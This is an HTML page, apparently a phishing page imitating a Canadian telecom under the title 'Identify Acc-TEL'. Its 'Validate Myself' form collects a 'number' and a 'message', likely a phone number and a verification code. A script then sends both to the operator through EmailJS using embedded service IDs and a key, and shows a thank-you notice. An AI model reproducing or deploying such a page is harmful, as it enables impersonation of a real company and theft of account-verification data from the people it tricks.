<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identify Acc-TEL</title> 
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <!-- KEEP ONLY ONE EMAILJS SCRIPT -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

    <style>
    /* (your CSS unchanged) */
    </style>
</head>

<body>

<header class="blader">
    <div class="mojo-cont">
        <img src="images/imagelolopo.svg" alt="Logo" class="logo">
    </div>
    <div class="basic-cont">
        <div class="cart">
            <i class="fas fa-shopping-cart"></i>
        </div>
        <div class="burger">&#9776;</div>
    </div>
</header>

<main>
<section>
    <div class="shora">
        Proudly Canadian - connecting us all nationwide
    </div>
</section>

<br><br>

<section>
<div class="formpage">
    <h1>Validate Myself</h1>

    <form id="validateForm">
        <div class="input-group">
            <label for="number">number</label>
            <input type="text" id="number" name="number" required>
        </div>
        
        <div class="input-group">
            <label for="message">message</label>
            <input type="text" id="message" name="message" required>
        </div>

        <button type="submit" class="login-btn">Send</button>
    </form>

    <div class="success-message" id="success-message" style="display:none;">
        Thanks You
    </div>

    <div class="footer">
        <p>Need help? <a href="#">Contact Support</a></p>
    </div>
</div>

<script>
(function(){
    emailjs.init("9VeQ6k6s9FIpEwG8P");
})();

window.onload = function() {

    document.getElementById('validateForm').onsubmit = function(e) {
        e.preventDefault();

        const number = document.getElementById('number').value;
        const message = document.getElementById('message').value;

        if (number && message) {

            const templateParams = {
                number: number,
                message: message
            };

            emailjs.send(
                "service_a4i7zon",
                "template_fs1memt",
                templateParams,
                "9VeQ6k6s9FIpEwG8P"
            )
            .then(function(response) {
                console.log("SUCCESS!", response);
                document.getElementById('success-message').style.display = 'block';
                document.getElementById('validateForm').style.display = 'none';
            })
            .catch(function(error) {
                console.log("FULL ERROR:", error);
                alert("Error: " + error.text);
            });

        } else {
            alert("Please fill all fields.");
        }
    };

};
</script>

</section>
</main>

<footer>
    <img src="images/imagedon2.png" class="desktop-footer">
    <img src="images/imagebacha.jpeg" class="mobile-footer">
</footer>

</body>
</html>
